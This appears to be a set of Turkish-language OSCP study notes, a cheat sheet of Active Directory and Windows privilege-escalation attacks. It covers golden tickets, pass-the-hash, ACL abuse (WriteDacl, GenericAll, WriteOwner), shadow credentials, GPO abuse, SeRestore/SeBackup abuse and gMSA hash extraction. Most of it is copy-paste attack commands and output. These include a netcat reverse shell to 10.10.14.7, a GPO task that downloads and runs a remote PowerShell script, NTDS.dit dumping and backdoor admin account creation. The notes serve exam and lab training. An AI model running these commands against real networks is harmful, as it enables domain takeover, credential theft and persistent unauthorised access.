# ── 6. BİLETİ YÜKLE & ERİŞİM SAĞLA ─────────────────────────

kerberos::ptt golden.kirbi                                    # Bileti belleğe yükle
klist                                                         # Yüklendi mi kontrol et
misc::cmd                                                     # Aynı terminal içinden yeni CMD aç

# Lateral Movement (Windows)
PsExec.exe \\<HEDEF_HOSTNAME> cmd.exe

# Linux üzerinden → .kirbi önce .ccache formatına çevrilmeli!
impacket-ticketConverter golden.kirbi golden.ccache           # Format dönüştür
export KRB5CCNAME=golden.ccache                               # Bileti tanıt
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<DC_IP>    # Bağlan

# ── 7. ÖZET AKIŞ ─────────────────────────────────────────────
# 1. mimikatz → privilege::debug
# 2. lsadump::dcsync /user:krbtgt        → krbtgt hash al
# 3. whoami /user                         → Domain SID öğren
# 4. kerberos::purge                      → eski biletleri temizle
# 5. kerberos::golden /user:Administrator → golden ticket oluştur
# 6. kerberos::ptt golden.kirbi           → belleğe yükle
# 7. PsExec / misc::cmd                   → domain'de gezin
```

PASS THE HASH - OVER PASS THE HASH - PASH THE TICKET

```
# ============================================================
# PASS-THE-HASH / OVERPASS-THE-HASH / PASS-THE-TICKET - OSCP
# ============================================================

# ── 1. FARKLAR ───────────────────────────────────────────────
# Pass-the-Hash (PtH)       → NTLM hash ile NTLM tabanlı servislerde oturum aç (port 139,445)
# Overpass-the-Hash (OPtH)  → NTLM hash ile Kerberos TGT üret → Kerberos servislerine eriş
# Pass-the-Ticket (PtT)     → Bellekteki .kirbi biletini çalıp başka oturuma enjekte et

# ── 2. PASS-THE-HASH (PtH) ───────────────────────────────────
# Gereksinim: port 139 veya 445 açık olmalı

# Impacket araçlarıyla (Linux)
impacket-psexec <DOMAIN>/<USER>@<IP> -hashes ':<NTHASH>'
impacket-wmiexec <DOMAIN>/<USER>@<IP> -hashes ':<NTHASH>'
impacket-smbexec <DOMAIN>/<USER>@<IP> -hashes ':<NTHASH>'

# NetExec ile
nxc smb <IP> -u <USER> -H <NTHASH>
nxc smb <IP> -u <USER> -H <NTHASH> -x 'whoami'

# ── 3. OVERPASS-THE-HASH (OPtH) ──────────────────────────────
# Gereksinim: NTLM hash var ama 139/445 kapalı veya servis sadece Kerberos kabul ediyor

# Yöntem A → Mimikatz ile (Windows)
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords                                      # Önce hash'i al
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTHASH> /run:powershell
# → Yeni bir PowerShell oturumu açılır, bu oturum hedef kullanıcı kimliğiyle çalışır
# → whoami hâlâ seni gösterir ama klist hedef kullanıcının biletini gösterir

________________________________________________________________________________________________________________
| mimikatz # privilege::debug                                                                                   |
| mimikatz # sekurlsa::logonpasswords                                                                           |
| mimikatz # sekurlsa::pth /user:burak /domain:test.com/ntlm:3************************ /run:powershell          |
|_______________________________________________________________________________________________________________|

# Biletin yüklendiğini doğrula
klist                                                         # Cached Tickets > 0 ise başarılı

# Yöntem B → Impacket ile (Linux)
impacket-getTGT <DOMAIN>/<USER> -hashes ':<NTHASH>'           # .ccache üretir
export KRB5CCNAME=<USER>.ccache                               # Bileti tanıt
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>          # Kerberos ile bağlan

# ── 4. PASS-THE-TICKET (PtT) ─────────────────────────────────
# Gereksinim: Bellekte başka bir kullanıcının .kirbi bileti mevcut olmalı

# Adım 1 → Erişim dene (access denied alırsan devam et)
ls \\web04\backup

# Adım 2 → Debug yetkisi al
privilege::debug

# Adım 3 → RAM'deki tüm Kerberos biletlerini dışa aktar
sekurlsa::tickets /export

# Adım 4 → Oluşan .kirbi dosyalarını listele, hedef sisteme ait olanı seç
dir *.kirbi

# Adım 5 → Doğru bileti belleğe enjekte et
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-teeb04.kirbi

# Adım 6 → Biletin yüklendiğini doğrula
klist

# Adım 7 → Tekrar eriş
ls \\web04\backup

# ── 5. BİLETLE LATERAL MOVEMENT ──────────────────────────────

# Keşif
net view \\<HEDEF>                                            # Paylaşımları gör
ls \\<HEDEF>\C$                                               # C diskine bak (admin gerekir)

# Reverse shell al
.\PsExec.exe \\<HEDEF> cmd.exe                                # Basit CMD
.\PsExec.exe \\<HEDEF> -s cmd.exe /c "powershell -e <BASE64>" # SYSTEM yetkili reverse shell

# Linux üzerinden (bilet .ccache formatında olmalı)
impacket-ticketConverter ticket.kirbi ticket.ccache           # Format dönüştür
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>

# ── 6. ÖZET AKIŞ ─────────────────────────────────────────────
# PtH   → Hash al → impacket-psexec / nxc ile direkt bağlan (445 açıksa)
# OPtH  → Hash al → sekurlsa::pth ile TGT üret → klist doğrula → ağda gezin
# PtT   → sekurlsa::tickets /export → doğru .kirbi seç → kerberos::ptt → klist → eriş
```

WRITEDACL

```xml
WriteDacl iznine sahipsen, o nesnenin güvenlik kurallarını (ACL) yeniden yazabilirsin. Yani, kendini o nesnenin yöneticisi yapabilirsin.
Basitçe: "İzinleri Değiştirme İzni" demektir. Bir nesne (dosya, klasör, servis, registry anahtarı) üzerinde WriteDacl yetkisine sahipsen, o nesnenin sahibi olmasan bile, kendine o nesne üzerinde "Full Control" 
(Tam Yetki) verebilirsin. OSCP sınavında ve laboratuvarlarında bu, Privilege Escalation (Yetki Yükseltme) aşamasının "Kutsal Kasesi" gibidir. Genellikle düşük yetkili bir kullanıcıdan SYSTEM veya Administrator 
seviyesine çıkmak için kullanılır. 1. Teknik Mantığı Nedir?
Windows'ta her nesnenin bir Security Descriptor'ı vardır. Bunun içinde DACL (Discretionary Access Control List) bulunur. DACL, "Ahmet okuyabilir, Mehmet silebilir, Ayşe çalıştırabilir" diyen listedir.
Eğer senin kullanıcının bir serviste WriteDacl yetkisi varsa, Windows sana şunu der: "Şu an bu servisi durduramazsın veya yapılandıramazsın, ama izinler listesini (DACL) silip yeniden yazabilirsin."
Saldırgan Mantığı: "Madem listeyi düzenleyebiliyorum, o zaman listeye 'Benim Kullanıcım = Full Control' satırını eklerim."

yöntem 1
### 1. Adım: Kendine "Full Control" Ver
WriteDACL yetkini kullanarak, ACL'i düzenle ve kendine GenericAll (FullControl) ver.
# Impacket dacledit.py kullanarak
python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'burak' -target 'HedefAdmin' 'domain.local'/'burak':'burak123'

### 2. Adım: Yetkiyi Kontrol Et / Kullan
Artık GenericAll sahibisin. İster şifre sıfırla, ister Shadow Credentials yap.
# Örnek: Şifresini sıfırla (Artık yapabilirsin çünkü FullControl aldın)
rpcclient -U "burak%burak123" IP -c "setuserinfo2 HedefAdmin 23 'YeniSifre123!'"

----

yöntem 2 

Buradaki senaryoda, Aarti ve Komal adında iki kullanıcı oluşturacağız; bu senaryoda Komal kullanıcısı, Aarti kullanıcısı üzerinde 'WriteDacl' (DACL Yazma) iznine sahip olacak.

komal ---writedacl---> aarti
komal bizim kullanıcımız 

kendine yetki ver 
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'komal' -target-dn 'CN=aarti,CN=Users,DC=ignite,DC=local' 'ignite.local'/'komal':'Password@1' -dc-ip 192.168.1.3

Sonuç olarak, kullanıcı hedef üzerinde tam kontrole (Full Control) sahip olduğunda, ya Kerberoasting saldırısını gerçekleştirebilir ya da hedefin mevcut parolasını bilmesine gerek kalmadan parolasını 
değiştirebilir (ForceChangePassword). bundan sonra ister kerberosting yap, ister şifre değiştir.

./targetedKerberoast.py --dc-ip '192.168.1.3' -v -d 'ignite.local' -u 'komal' -p 'Password@1'
burda hash düşer ve crack edersin ordan yürü istersen de hedef kullanıcının şifresini değiştir ordan yürü, mantıklı olan bu, kerberostingi bu adımdan sonra da yapabilirsin 

şifre değiştirme yöntem 1: net rpc password aarti 'Password@987' -U ignite.local/raj%'Password@1' -S 192.168.1.48
şifre değiştirme yöntem 2: bloodyAD --host "192.168.1.3" -d "ignite.local" -u "komal" -p "Password@1" set password "aarti" "Password@789"
```

TARGETED KERBEROSTING

```
TARGETED KERBEROSTING 
Bu yöntem, sızma testlerinde "gürültü çıkarmadan" yetki yükseltmek için altın değerindedir. Şifreyi değiştirmek yerine, hedef hesabı Kerberos protokolünün bir "özelliği" (veya zafiyeti) olan Kerberoasting 
saldırısına açık hale getiriyoruz. Senaryomuz yine aynı: burak kullanıcısının admin hesabı üzerinde GenericAll yetkisi var.

### Adım 1: Hedef Hesaba SPN Atama (Saldırıya Hazırlık)
Normalde her kullanıcının SPN'i (Servis İsim Kaydı) yoktur. `GenericAll` yetkisi sayesinde `admin` hesabına sanki bir web sunucusuymuş gibi sahte bir servis ismi ekliyoruz.
Araç: Impacket - addspn.py
# Burak'ın yetkisini kullanarak Admin hesabına "fake/service" SPN'ini ekle
addspn.py -u "burak" -p "burak123" -target-type user -additional "fake/service" "admin" 10.10.10.10`

- **additional:** Eklemek istediğin sahte servis adı.
- **"admin":** SPN eklenecek olan kurban hesap.
- **Sonuç:** `admin` hesabı artık bir "servis hesabı" gibi görünür ve Kerberoasting yapılabilir hale gelir.

### Adım 2: TGS Bileti İsteme (Hash Çekme)
Artık sistem `admin` hesabını bir servis hesabı sanıyor. Şimdi herhangi bir domain kullanıcısı (yine `burak` olabilir) bu servis için bir bilet isteyebilir.
**Araç:** Impacket - `GetUserSPNs.py`

`# Admin hesabı için şifrelenmiş bileti (hash) iste ve ekrana dök
GetUserSPNs.py -request -dc-ip 10.10.10.10 "domain.local/burak:burak123"`

- **request:** DC'den bileti (TGS) gerçekten istemeni sağlar.
- **Sonuç:** DC, sana `admin` kullanıcısının şifresiyle şifrelenmiş bir bilet gönderir. Bu bilet aslında `admin`'in şifresinin bir parçasıdır (hash).

### Adım 3: Hash'i Kırma (Offline Brute Force)
Ekrana düşen `$krb5tgs$23$...` formatındaki hash'i bir dosyaya (`hash.txt`) kaydet. Şimdi kendi makinenin gücünü kullanarak şifreyi bulmaya çalış.
**Araç:** `hashcat` veya `john`
`# Hashcat ile şifreyi kırmayı dene
hashcat -m 13100 hash.txt rockyou.txt`
```

GENERICALL

```
GenericAll (Full Control), Active Directory'deki en güçlü yetkidir, ancak bu yetkiyi neyin üzerinde (User, Group, Computer) sahip olduğuna göre saldırı vektörü değişir.

—> computers (resource based constrait delegation)
—> groups (abuse group membership)
—> users (Force Password Change)

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

1 RBCD
Örnek iş akışı 
impacket-addcomputer pentest.local/burak.dirlik -dc-ip $IP -hashes :1******************************* -computer-name 'DORK$' -computer-pass 'Dork123!'
wget https://raw.githubusercontent.com/tothi/rbcd-attack/refs/heads/master/rbcd.py  
python3 rbcd.py -dc-ip $IP -t PENTESTDC -f 'DORK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 pentest\\burak.dirlik
impacket-getST -spn cifs/pentestdc.pentest.local pentest/dork\$:'Dork123!' -impersonate Administrator -dc-ip $IP
export KRB5CCNAME=./Administrator@cifs_pentestdc.pentest.local@PENTEST.LOCAL.ccache
sudo impacket-psexec -k -no-pass pentestdc.pentest.local -dc-ip 192.168.104.175

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

GROUPS
2) Abuse Group Membership (Gruba Kendini Ekleme) 
Senaryo: HighPrivGroup üzerinde GenericAll yetkin var.

Ne yaparsın?
# Linux (rpcclient veya net rpc kullanarak)
	       Genericall yetkili hesap
rpcclient -U "Kullanici%Sifre" IP -c "addgroupmem HighPrivGroup KendiKullanicin"
Veya netexec (crackmapexec) ile
nxc smb IP -u User -p Pass --groups 'HighPrivGroup' --add-member 'KendiKullanicin'
Sonuç: Artık o grubun tüm haklarına sahipsin.

Diyelim ki elinde Stajyer_Ali hesabı var ve şifresi Sifre123. Şans eseri fark ettin ki Stajyer_Ali hesabı, IT_Yoneticileri grubu üzerinde tam yetkiye (GenericAll) sahip.
# nxc (crackmapexec) örneği:
nxc smb 10.10.10.10 -u 'Stajyer_Ali' -p 'Sifre123' --groups 'IT_Yoneticileri' --add-member 'Stajyer_Ali'

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

3) Şifre Sıfırlama (Force Password Change) - "burak%burak123" senin kullanıcın, admin/admin123  admine zaten var, şifresini admin123 yapmış oldun
Eğer GenericAll yetkisine sahip olduğun obje bir Kullanıcı ise, o kullanıcının şifresini bilmesen bile zorla değiştirebilirsin.
Burada rpcclient aracını kullanarak DC ye gidiyorsun. DC'ye diyorsun ki: Ben burak kullanıcısıyım, şifrem burak123. admin kullanıcısının bilgilerini güncellemek istiyorum onun da şifresi admin123
rpcclient -U "burak%burak123" 10.10.10.10 -c "setuserinfo2 admin 23 'admin123'"

net rpc ile Uygulama - Bu komut daha okunabilir bir yapıdadır:
net rpc password "admin" "admin123" -U "burak%burak123" -S 10.10.10.10

---
diğer senaryo 

rpcclient -U nagoya-industries/svc_helpdesk 192.168.228.21
# şifre girilir
setuserinfo2 Christopher.Lewis 23 Newpass123!

# Yeni şifreyle sisteme login ol
evil-winrm -i 192.168.228.21 -u christopher.lewis -p 'Newpass123!'
```

WRITEOWNER

```
WRITE OWNER 
Active Directory yetki yükseltme zincirinin en sinsi ilk adımıdır. Mantık tamamen "Mülkiyet Hakkı" üzerine kuruludur.

İşleyişi bir gayrimenkul üzerinden düşün:

GenericAll: Evin sahibisin, içinde her şeyi yaparsın.
WriteDACL: Evin tapu dairesindeki izin belgesine yazı yazma yetkindir.
WriteOwner: Evin tapusunu kendi üzerine alma yetkindir.

### WriteOwner ile Yetki Yükseltme Zinciri (Adım Adım)
Eğer BloodHound'da bir kullanıcı üzerinde **WriteOwner** yetkin olduğunu gördüysen, şu 3 adımlı dansı yapman gerekir:
### 1. Adım: Sahipliği Üzerine Al (Take Ownership)
Önce nesnenin (kullanıcı, grup veya bilgisayar) "Owner" (Sahibi) kısmını kendi hesabın yaparsın. Active Directory kurallarına göre, bir nesnenin sahibi olan kişi, o nesnenin izinlerini (**DACL**) değiştirme hakkına otomatik olarak sahip olur.
### 2. Adım: Kendine İzin Ver (WriteDACL)
Artık nesnenin sahibi sensin. Şimdi "Ben sahibiyim, bu yüzden kendime bu kullanıcı üzerinde **Full Control (GenericAll)** yetkisi veriyorum" dersin.
### 3. Adım: Hedefi Ele Geçir (GenericAll)
Artık `GenericAll` sahibisin. Şifre sıfırla, gruba ekle veya Shadow Credentials yap; seçim senin.

### Linux Üzerinden Nasıl Yapılır? (bloodyAD örneği)
Linux tarafında bu zinciri en temiz yürüten araçlardan biri **bloodyAD**'dir.
Senaryo: burak kullanıcısı, admin kullanıcısı üzerinde WriteOwner yetkisine sahip.

1. Sahipliği Değiştir:
python3 bloodyAD.py -d domain.local -u burak -p burak123 --host 10.10.10.10 set owner 'admin' 'burak'

2. Kendine Full Yetki Ver (GenericAll):
python3 bloodyAD.py -d domain.local -u burak -p burak123 --host 10.10.10.10 add ace 'admin' 'burak' 'GenericAll'

3. Artık Admin'in Şifresini Sıfırla:
rpcclient -U "burak%burak123" 10.10.10.10 -c "setuserinfo2 admin 23 'YeniSifre123!'"
```

SHADOW CREDENTIALS

```
shadow credentials - rbcd alternatifi

# Shadow Credentials
Bu yöntem, Active Directory dünyasında RBCD'nin (Resource Based Constrained Delegation) pabucunu dama atan, modern ve "sinsi" bir tekniktir.
Neden herkes buna bayılıyor? Çünkü **MachineAccountQuota (MAQ)** derdin yok. Yani domainde yeni bir bilgisayar oluşturmana gerek kalmadan, doğrudan hedefi ele geçiriyorsun.

### Mantık: "Yedek Anahtar Kopyalamak"
Normalde bir hesaba girmek için şifresini (NTLM Hash) bilmen gerekir, değil mi? Ama Windows'un modern sürümlerinde (Server 2016 ve sonrası) **Windows Hello for Business (WHfB)** diye bir özellik var. 
Hani şu parmak iziyle, yüz tanımayla giriş yaptığın olay. İşte bu özellik, şifre yerine **Sertifika (Certificate/Key)** kullanır. Bu sertifikaların bilgisi de kullanıcının veya bilgisayarın msDS-KeyCredentialLink
adlı bir özelliğinde (attribute) saklanır.

Saldırı Mantığı Şudur:
1. Senin `GenericAll` yetkin var. Yani o nesnenin her şeyini değiştirebilirsin.
2. Gidiyorsun, kendi bilgisayarında gizli bir anahtar (Private Key) ve buna uygun bir sertifika oluşturuyorsun.
3. Bu sertifikayı hedefin **`msDS-KeyCredentialLink`** özelliğine **yazıyorsun (Inject)**.
4. Artık DC'ye gidip: *"Bak bende bu hesabın sertifikası var, bana TGT (Giriş Bileti) ver"* diyorsun.
5. DC, şifre sormadan sana bileti veriyor. **BUM!** İçeridesin.

### Adım Adım Uygulama (Linux - `pywhisker` ile)

pywhisker aracı üzerinden gidelim.
Senaryo: burak kullanıcısısın, HedefAdmin üzerinde GenericAll yetkin var.
### 1. Adım: Sertifikayı Enjekte Et (Shadow Credential Ekleme)

# pywhisker ile hedef hesaba kendi ürettiğimiz anahtarı ekliyoruz
python3 pywhisker.py -d "domain.local" -u "burak" -p "burak123" --target "HedefAdmin" --action "add"

Bu komut sana şunları verecek:
- Device ID: Eklenen anahtarın kimliği (silmek için lazım olacak).
- Certificate PFX: Sertifika dosyası.
- Certificate Password: Sertifikanın şifresi.
### 2. Adım: Sertifika ile TGT (Bilet) İste
Şimdi elimizdeki sertifikayı kullanarak Kerberos bileti (TGT) alacağız. Buna teknik olarak PKINIT denir.

# Certipy veya gettgtpkinit.py kullanarak bilet al
python3 gettgtpkinit.py -pfx "base64_pfx_kodu_veya_dosyasi" -pfx-pass "sertifika_sifresi" "domain.local/HedefAdmin" "hedef.ccache"

### 3. Adım: Bileti Kullan (Pass-the-Ticket)

Artık elinde hedef.ccache dosyası var. Bu dosya HedefAdmin'in kimlik kartıdır.

# Bileti ortam değişkenine ata
export KRB5CCNAME=hedef.ccache

# Artık admin gibi davranarak şifreleri çek (DCSync)
secretsdump.py -k -no-pass "domain.local/HedefAdmin@DC_IP"
```

SERESTORE PRIVILEGE bu konunun notları sıkıntılı gibi bi bak

```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

github.com/0x4D-5A/Invoke-SeRestoreAbuse bunu baz al 
# 1. Scripti sisteme yükle ve import et
Import-Module .\Invoke-SeRestoreAbuse.ps1

# 2. Doğrudan SYSTEM yetkisinde komut çalıştır (Örn: Reverse Shell)
Invoke-SeRestoreAbuse -Command "C:\Users\Public\nc.exe 10.10.14.7 4444 -e cmd.exe"

# 3. Veya sadece bir kullanıcı ekleyip admin yap (Sessiz yöntem)
Invoke-SeRestoreAbuse -Command "net user gemini Password123 /add"
Invoke-SeRestoreAbuse -Command "net localgroup administrators gemini /add"

# 4. Doğrulama aşağıdaki gibi
PS C:\> Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "whoami > C:\foo.txt"'
[+] SeRestorePrivilege privilege enabled
[+] ImagePath set to: cmd /c powershell -c "whoami > C:\foo.txt"
[+] Seclogon service started
[+] ImagePath restored to: %windir%\system32\svchost.exe -k netsvcs -p
PS C:\> type foo.txt
nt authority\system

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Gtworek'in meşhur scriptini veya benzeri bir yetki aktifleştiriciyi kullan:   -bu yöntem çalışıyor 
https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1
Import-Module .\EnableSeRestorePrivilege.ps1
[Privileges]::EnableAll()

# Doğrula (Enabled görünmeli)
whoami /priv

# ==========================================================
#  UTILMAN YÖNTEMİ (GUI VARSA - RDP/VNC)
# ==========================================================

# A. Orijinal dosyanın yedeğini al (HAYATİ ÖNEM TAŞIR - Penalty almamak için)
copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.bak

# B. cmd.exe'yi utilman.exe üzerine yaz (SeRestore sayesinde hata almazsın)
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

# C. Tetikleme:
rdesktop ip 
# RDP ekranında (Logon Screen) 'Win + U' tuşlarına bas veya 'Erişim Kolaylığı' butonuna tıkla.
# Karşında SYSTEM yetkisinde CMD açılacak.
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

GPO ABUSE

```
GPO ABUSE 

Sen bir kullanıcı ele geçirdin (burakuser). whoami /priv yaptın, dişe dokunur bir şey yok. Ama sonra PowerView ile bir baktın ki, senin bu kullanıcının bir GPO'yu düzenleme (Edit/Write) yetkisi var.
Sen gidip o GPO'nun içine "burakuser artık bu makinede admindir" kuralını ekliyorsun. Windows gidip o kuralı DC'den okuyor ve "Tamam, sen artık adminsin" diyor. Özetle:
whoami /priv çıktısında "SeGPOAbuse" diye bir şey görmezsin. GPO sömürüsü için bakman gereken şey senin kullanıcının Active Directory içindeki izinleridir (ACL).

ilk yol - local admin olma odaklı 
1. ADIM: GPO YETKİ ANALİZİ (PowerView) - 'burakuser' kullanıcısının hangi GPO'lar üzerinde yazma yetkisi olduğunu bulur. Çıktıda 'WriteProperty', 'WriteDacl' veya 'GenericAll' görmeyi bekliyoruz.
import-module .\PowerView.ps1
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ?{$_.IdentityReference -match "burakuser"}

2. ADIM: GPO BİLGİLERİNİ NETLEŞTİRME - Yetkin olan GPO'nun DisplayName ve GUID bilgisini not al.
Get-NetGPO -Name "Default Domain Policy"

3. ADIM: SHARPGPOABUSE İLE SALDIRI - Kullanıcıyı 'Local Administrator' grubuna ekleyen kuralı GPO'ya enjekte eder.
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount burakuser --GPOName "Default Domain Policy"

alternatif 
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author Adminburak--Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.2.137/run.txt'))"" --GPOName "Default Domain Policy" 

4. ADIM: POLİTİKAYI GÜNCELLEME VE ERİŞİM - Değişikliklerin hemen yansıması için tetikle (Hedef makinede çalışmalı)
gpupdate /force

5. Admin olup olmadığını kontrol et
net localgroup Administrators

6. Kali üzerinden tam yetkili erişim sağla
impacket-psexec testdomain.oscp/burakuser:ghostHM@192.168.10.222

İkinci yol domain admin olma odaklı 
Windows powershell terminal 

import-module .\PowerView.ps1
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ?{$_.IdentityReference -match "burak"}
Get-NetGPO -Name "Default Domain Policy"

┌──(sandbox)─(root㉿kali)-[/home/kali/Desktop/TOOLS/pyGPOAbuse]
└─# python3 /usr/share/doc/python3-impacket/examples/owneredit.py -action write -new-owner 'burak' -target-dn "CN={3*******-****-****-****-************},CN=Policies,CN=System,DC=mock,DC=exam" -dc-ip 10.10.10.10 'mock.exam'/'burak':'p@ssw0rd1'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-*-**-**********-**********-**********-***
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=mock,DC=exam
[*] OwnerSid modified successfully!
                                                                                                                                                 
┌──(sandbox)─(root㉿kali)-[/home/kali/Desktop/TOOLS/pyGPOAbuse]
└─# python3 /usr/share/doc/python3-impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -principal 'burak' -target-dn "CN={3*******-****-****-****-************},CN=Policies,CN=System,DC=mock,DC=exam" -dc-ip 10.10.10.10 'mock.exam'/'burak':'p@ssw0rd1'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260218-170818.bak
[*] DACL modified successfully!
                                                                                                                                                 
┌──(sandbox)─(root㉿kali)-[/home/kali/Desktop/TOOLS/pyGPOAbuse]
└─# python3 pygpoabuse.py 'mock.exam/burak:p@ssw0rd1' -gpo-id "3*******-****-****-****-************" -taskname "Webdev disable" -dc-ip 10.10.10.10 -powershell -command "net group 'Domain Admins' burak /add"
[+] ScheduledTask Webdev disable created!

powershell terminal
gpupdate /force
net group "Domain Admins" /domain
burda burak kullanıcısını admin olarak görmelisin 

kali terminal 
impacket-secretdump 'mock.exam'/'burak':'p@ssw0rd1'@10.10.10.10
sonra bulduğun hashlerler evil-winrm veya farklı protokoller ile bağlan

---

sharpgpoabuse - bu baya iyi - windows için ve hızlı 
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
Evil-WinRM* PS C:\Users\anirudh\Documents> upload /home/kali/SharpGPOAbuse.exe
Evil-WinRM* PS C:\TEMP> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount burak --GPOName "Default Domain Policy"
Evil-WinRM* PS C:\TEMP> gpupdate /force
Evil-WinRM* PS C:\TEMP> net localgroup Administrators
python3 /usr/share/doc/python3-impacket/examples/psexec.py mock.exam/burak:Passwd01@192.168.201.172
```

**SEMANAGEVOLUME PRIVILEGE**

[SeManageVolumePrivilege - HackFast](https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/#step-1-check-current-user-privileges)

SEBACKUPRIVILEGE

```bash
SeBackupPrivilege privilege escalation + NTDS.dit dump zinciri.

*Evil-WinRM* PS C:\Users\burak\Desktop> type ine.txt

set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias ine
create
expose %ine% E:
end backup

*Evil-WinRM* PS C:\Users\burak\Desktop> diskshadow /s ine.txt
*Evil-WinRM* PS C:\Users\burak\Desktop> robocopy /b e:\windows\ntds . ntds.dit
*Evil-WinRM* PS C:\Users\burak\Desktop> reg save hklm\system system
*Evil-WinRM* PS C:\Users\burak\Desktop> download ntds.dit
*Evil-WinRM* PS C:\Users\burak\Desktop> download system

┌──(kali🎃kali)-[~/burak]
└─$ impacket-secretsdump -system system -ntds ntds.dit local
```

[SeBackupPrivilege/SeRestorePrivilege - HackFast](https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeBackupPrivilege-SeRestorePrivilege/#step-2-enable-sebackupprivilege-optional)

SEDEBUGPRIVILEGE

[SeDebugPrivilege - HackFast](https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeDebugPrivilege/)

SETAKEOWNERSHIPPRIVILEGE

[SeTakeOwnershipPrivilege - HackFast](https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeTakeOwnershipPrivilege/#step-3-taking-ownership-of-the-file)

GMSA

```xml
**AD Lateral Movement: gMSA Exploitation Cheat Sheet**
gMSA (group Managed Service Accounts), şifresi AD tarafından yönetilen özel hesaplardır. Eğer bir kullanıcı/grup bu hesabın şifresini okuma yetkisine (**ReadGMSAPassword**) sahipse, bu doğrudan bir **Privilege 
Escalation** veya **Lateral Movement** fırsatıdır.

**1. Keşif (Enumeration)**
Sistemde gMSA hesabı var mı ve senin kullanıcının bu hesaba erişimi var mı kontrol et.
**Yöntem A: BloodHound (En Hızlı Yol)**
• **Arama:** Hedef gMSA hesabını bul (genellikle sonu `$` ile biter).
• **Analiz:** Hesaba sağ tıkla -> **Target Report** -> **Inbound Object Control**.
• **Edge:** `ReadGMSAPassword` ilişkisini görüyorsan, o oku gönderen kullanıcıya sahip olduğunda şifreyi çekebilirsin.
**Yöntem B: PowerView (Detaylı Analiz)**PowerShell
****

`# 1. Tüm gMSA hesaplarını ve özelliklerini listele
Get-ADServiceAccount -Filter * -Properties msDS-GroupMSAMembership

# 2. Belirli bir gMSA hesabı üzerindeki ACL izinlerini kontrol et
Get-DomainObjectAcl -Identity "svc_apache$" | ? {$_.ActiveDirectoryRights -match "ReadProperty"}`

**2. Parola (NTLM Hash) Çekme**
Eğer yetkin varsa, gMSA hesabının parolasını temiz metin olarak göremezsin ama **NTLM Hash**'ini çekebilirsin.
**Yöntem A: GMSAPasswordReader (Windows - En Yaygın)**PowerShell
****
`# gMSA hesabının adını belirterek hash'i çek
.\GMSAPasswordReader.exe --AccountName "svc_apache$"`

**Yöntem B: Native PowerShell (AD Modülü Varsa)**PowerShell

# MODÜL GEREKTİRMEYEN VE DİREKT ÇALIŞAN VERSİYON
# 1. Veriyi ADSI üzerinden çek (Modülsüz)
$searcher = [adsisearcher]"(samaccountname=svc_apache$)"
$result = $searcher.FindOne()
$mp = $result.Properties["msds-managedpassword"][0]

# 2. Decode işlemi (Burası en temiz çalışan yöntemdir)
$is_64bit = [IntPtr]::Size -eq 8
$address = [Runtime.InteropServices.Marshal]::AllocHGlobal($mp.Length)
[Runtime.InteropServices.Marshal]::Copy($mp, 0, $address, $mp.Length)

# Bu kısım NTLM Hash'i (RC4) bulup çıkarır
# Not: Karmaşık geliyorsa direkt SharpGMSA.exe kullan geç, vakit kaybetme!

`privilege::debug
sekurlsa::pth /user:svc_apache$ /domain:lab.local /ntlm:<ALDIĞIN_HASH> /run:powershell.exe`

**Yöntem B: Impacket (Kali üzerinden)**
Eğer makineye dışarıdan erişimin varsa:
****
`impacket-psexec lab.local/svc_apache$@10.10.10.10 -hashes :<ALDIĞIN_HASH>`

**💡 Kritik OSCP İpuçları**
• **Dolar İşareti:** gMSA hesap isimlerinin sonundaki `$` işaretini unutma (Örn: `svc_sql$`).
• **Grup Üyeliği:** Eğer doğrudan kullanıcına yetki verilmemişse, kullanıcının üye olduğu grupları kontrol et. Genellikle yetki "Web Admins" gibi bir gruba verilir.
• **Servis Kontrolü:** gMSA hesabını ele geçirdiğinde, bu hesabın hangi sunucularda **Local Admin** olduğunu veya hangi servisleri (IIS, SQL, Task Scheduler) yönettiğini mutlaka kontrol et.

Evil-WinRM* PS C:\\Users\\enox> ./GMSAPasswordReader.exe --accountname svc_apache
Çıktıda rc4_hmac araman lazım, bu NTLM dir. 

